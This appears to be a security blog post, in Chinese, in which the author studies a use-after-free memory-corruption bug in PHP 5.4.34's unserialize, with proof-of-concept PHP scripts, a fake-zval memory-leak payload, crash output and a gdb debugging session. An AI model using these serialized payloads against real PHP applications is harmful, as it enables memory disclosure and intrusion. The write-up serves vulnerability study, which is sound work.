@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html>
+
+
+    <head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PHP中的内存破坏漏洞利用学习</title>
+<meta name="description" content="A blog about programming and network security">
+
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="stylesheet" href="/css/my_code.css">
+<!-- below font-awesome.css can not be replaced by local file,error will occur -->
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
+<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
+<link rel="stylesheet" href="/css/highlightjs.piperita.css">
+
+<!-- Favicons generated at https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/favicons/manifest.json">
+<link rel="shortcut icon" href="/favicons/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
+<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+<!-- 下面这句是添加在线中文字体:文泉驿等宽正黑 -->
+<script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script>
+
+
+
+
+
+
+</head>
+
+
+    <body>
+
+    <nav id="my-menu">
+  <div>
+    <p>quanyechavshuo</p>
+
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <!--https://fontawesome.io/icons/ -->
+    <br>
+    <center>
+    <font color="red" align="center"><i class="fa fa-link" aria-hidden="true"></i><a href="../../../../../bookmarks.html"><font color="red"> link</font></a></font>
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-key" aria-hidden="true"></i><a href="../../../../../book.html" target="_top"><font color="red"> book</font></a></font>
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-caret-square-o-right" aria-hidden="true"></i><a href="../../../../../mv.html" target="_top"><font color="red"> movie</font></a></font>
+    </center>
+    <p class="links">
+  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
+  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
+  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
+</p>
+
+  </div>
+</nav>
+<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
+
+
+
+    <div class="page-content">
+      <div class="wrap">
+      
+
+<div class="container-fluid single">
+  <div class="row">
+
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
+      
+
+      <h1 class="header" itemprop="name">PHP中的内存破坏漏洞利用学习</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">April 19, 2017</span>
+           under web
+        </i></small>
+      </div>
+
+      <div class="read-time">
+        <small>
+          3 minute read
+        </small>
+      </div>
+
+      <div class="content-panel content">
+
+        
+
+        <span itemprop="articleBody"><h3 id="0x00-about">0x00 About</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>学习乌云中的&lt;&lt;PHP中的内存破坏漏洞利用&gt;&gt;
+link:http://cb.drops.wiki/drops/papers-4864.html
+
+看懂此文所需知识
+http://www.cnblogs.com/LittleHann/p/4242535.html
+</code></pre>
+</div>
+
+<h3 id="0x01-detail">0x01 Detail</h3>
+
+<h4 id="a调试环境">a)调试环境</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>kali2 x86 
+php5.4.34
+gdb
+</code></pre>
+</div>
+
+<h4 id="b环境配置">b)环境配置</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1.下载php5.4.34到/root/php5.4.34    
+    php5.4.34根目录下的.gdbinit是php为了方便被gdb调试,需要在gdb php之后source path/.gdbinit
+        link:https://phpor.net/blog/post/997
+        print_cvs:打印当前执行环境中已编译的PHP变量
+        printzv 0x....:打印指定的PHP变量,需要指定地址
+        zbacktrace:打印PHP函数调用栈
+        print_ft:打印函数表 
+        更多用法参考上面的链接
+
+2.编译php到指定目录
+    kali2.0下:
+    mkdir /usr/bin/ndphp
+    ./configure --prefix=/usr/bin/ndphp
+        如果报xml2-config错误则apt-get install libxml2-dev可解决
+    make
+    make install
+
+3.vi /root/StefanEsser_Original_POC.php
+    -----------start------------
+    &lt;?php
+    for ($i=4; $i&lt;100; $i++) {
+      var_dump($i);
+
+      $m = new StdClass(); 
+      $u = array(1); 
+      $m-&gt;aaa = array(1,2,&amp;$u,4,5);
+
+      $m-&gt;bbb = 1;
+      $m-&gt;ccc = &amp;$u;
+      $m-&gt;ddd = str_repeat("A", $i); 
+      $z = serialize($m);
+      $z = str_replace("bbb", "aaa", $z);
+
+      var_dump($z);
+
+      $y = unserialize($z);
+
+      var_dump($y);
+    }
+    ?&gt;
+    -----------end------------
+
+4.vi /root/StefanEsser_Original_LocalMemLeak.php
+    -----------start------------
+    &lt;?php
+    $data ='O:8:"stdClass":3:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;s:39:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;}';
+    $x = unserialize($data);
+    var_dump($x);
+    ?&gt;
+    -----------end------------
+5.vi /root/PHPLeak.php
+    -----------start------------
+    &lt;?php
+    $fakezval = pack(
+        'IIII',     //unsigned int
+        0x08048000, //address to leak
+        0x0000000f, //length of string
+        0x00000000, //refcount
+        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
+    );
+    //obj from original POC by @ion1c
+    $obj = 'O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:4:"AAAA";}';
+    $obj=unserialize($obj);
+
+    for($i = 0; $i &lt; 5; $i++) { //this i value is larger than usually required
+        $v[$i]=$fakezval.$i; //repeat to overwrite
+    }
+    //due to the reference being overwritten by our loop above, leak memory
+    echo $obj-&gt;ccc;
+    ?&gt;
+    -----------end------------
+</code></pre>
+</div>
+
+<h4 id="c调试">c)调试</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>测试StefanEsser_Original_POC.php是否会导致php解释器出问题
+    └&gt; /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php 
+    int(4)
+    string(134) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:4:"AAAA";}"
+    object(stdClass)#2 (3) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(4) "AAAA"
+    }
+    int(5)
+    string(135) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:5:"AAAAA";}"
+    object(stdClass)#1 (3) {
+      ["aaa"]=&gt;
+      int(-1254177400)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(5) "AAAAA"
+    }
+    int(6)
+    string(136) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:6:"AAAAAA";}"
+    object(stdClass)#3 (3) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(6) "AAAAAA"
+    }
+    int(7)
+    string(137) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:7:"AAAAAAA";}"
+    object(stdClass)#2 (3) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(7) "AAAAAAA"
+    }
+    int(8)
+    string(138) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:8:"AAAAAAAA";}"
+    object(stdClass)#1 (3) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(8) "AAAAAAAA"
+    }
+    int(9)
+    string(139) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:9:"AAAAAAAAA";}"
+    [1]    2141 segmentation fault  /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php
+
+    果然出现segmentation fault
+
+动态调试php
+    └&gt; gdb /usr/bin/ndphp/bin/php
+    GNU gdb (Debian 7.11.1-2) 7.11.1
+    Copyright (C) 2016 Free Software Foundation, Inc.
+    License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+    This is free software: you are free to change and redistribute it.
+    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+    and "show warranty" for details.
+    This GDB was configured as "x86_64-linux-gnu".
+    Type "show configuration" for configuration details.
+    For bug reporting instructions, please see:
+    &lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+    Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+    For help, type "help".
+    Type "apropos word" to search for commands related to "word"...
+    Reading symbols from /usr/bin/ndphp/bin/php...done.
+
+    [加载php根目录下的.gdbinit]
+    source /root/php-5.4.34/.gdbinit
+
+    [下断点]
+    (gdb) b var_unserializer.c:337
+
+    [运行StefanEsser_Original_LocalMemLeak.php]
+    r StefanEsser_Original_LocalMemLeak.php
+
+    [第一次命中]
+    Starting program: /usr/bin/ndphp/bin/php StefanEsser_Original_LocalMemLeak.php
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+
+    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa "", var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=2, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
+    337                             convert_to_string(key);
+
+    [跳过第一次命中后又发生了第二次命中]
+    (gdb) c
+    Continuing.
+
+    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa "", var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=1, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
+    337                             convert_to_string(key);
+
+    [执行print *(var_entries*)var_hash-&gt;first][乌云上的原文说的执行printzv *(var_entries)var_hash-&gt;first有误]
+    (gdb) print *(var_entries*)var_hash-&gt;first
+    $1 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &lt;repeats 1016 times&gt;}, used_slots = 8, next = 0x0}
+    可看出data变量是个数组,数组里面的内容是地址,这些地址指向unserialize函数解析的变量值,关注第5个0xb5c6f1c0(php
+    代码中用的是R:5).查看这个地址中的内容:
+
+    [printzv 0xb5c6f1c0]
+    (gdb) printzv 0xb5c6f1c0
+    [0xb5c6f1c0] (refcount=1) string(39): "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+    [步过断点继续运行]
+    (gdb) n
+    338                             zend_hash_update(ht, Z_STRVAL_P(key), Z_STRLEN_P(key) + 1, &amp;data,
+    这里的zend_hash_update为可疑函数
+    
+    步过该可疑函数并查看刚才地址0xb5c6f1c0中出现了什么内容
+    (gdb) n
+    342                     zval_dtor(key);
+    (gdb) printzv 0xb5c6f1c0
+    [0xb5c6f1c0] (refcount=0) string(39): "\35\0\0\0-\0\0\0\0\37777777761\37777777706\37777777665\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0-\0\0\0\35\0\0\0D\37777777761\37777777706"
+
+    还要确认下该地址是不是还在var_hash表中,然后继续运行
+    (gdb) print *(var_entries*)var_hash-&gt;first
+    $3 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &lt;repeats 1016 times&gt;}, used_slots = 8, next = 0x0}
+    发现还在
+
+    继续运行
+    (gdb) c
+    Continuing.
+    object(stdClass)#1 (2) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;string(39) "--D"
+    }
+    [Inferior 1 (process 2416) exited normally]
+
+</code></pre>
+</div>
+</span>
+
+        
+
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            php, 漏洞利用, 二进制
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+      <div class="content-panel feedback">
+        I <i class="fa fa-heart"></i> feedback.<br />
+        Let me know what you think of this article on twitter <a href="https://www.twitter.com/quanyechavshuo">@quanyechavshuo</a>!
+      </div>
+      
+
+
+      
+
+
+
+      
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="/web/2017/04/19/PHP中的内存破坏漏洞利用学习" data-title="" data-url="https://3xp10it.github.io//web/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"3xp10it"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+<!-- 多说公共JS代码 end -->
+
+<!-- 个人增加织网背景效果 -->
+<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+      
+
+
+      
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+
+
+      </div>
+    </div>
+
+    <div class="footer clearfix">
+  <div class="col-md-12">
+		  <!--for better experience please install font 文泉驿等宽正黑-->
+Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
+	<SCRIPT language=javascript> 
+	<!-- 
+	function show_date_time(){ 
+		window.setTimeout("show_date_time()", 1000); 
+		BirthDay=new Date("3/7/2016 20:00:00");
+		today=new Date(); 
+		timeold=(today.getTime() - BirthDay.getTime()); 
+		sectimeold=timeold/1000 
+		secondsold=Math.floor(sectimeold); 
+		msPerDay=24*60*60*1000 
+		e_daysold=timeold/msPerDay 
+		daysold=Math.floor(e_daysold); 
+		e_hrsold=(e_daysold-daysold)*24; 
+		hrsold=Math.floor(e_hrsold); 
+		e_minsold=(e_hrsold-hrsold)*60; 
+		minsold=Math.floor((e_hrsold-hrsold)*60); 
+		seconds=Math.floor((e_minsold-minsold)*60); 
+		//times = document.getElementById("times");
+		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
+	} 
+	show_date_time(); 
+	//--> 
+	</SCRIPT>
+  </div>
+</div>
+
+<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
+<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">github</font></a></div>
+<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
+<div class="my-archive"><i class="fa fa-folder" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
+<div class="my-categories"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">category</font></a></div>
+
+
+<script src="/js/jquery-1.11.0.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/jquery.mmenu.min.all.js"></script>
+<script src="/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+   $(document).ready(function() {
+      $("#my-menu").mmenu().on( "closed.mm", function() {
+            $(".menu-button").show();
+         });
+      $(".menu-button").click(function() {
+        $(".menu-button").hide();
+        $("#my-menu").trigger("open.mm");
+      });
+   });
+</script>
+
+
+
+
+
+<script type="text/javascript"> 
+$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
+$youziku.draw(); 
+</script>
+
+
+    </body>
+</html>
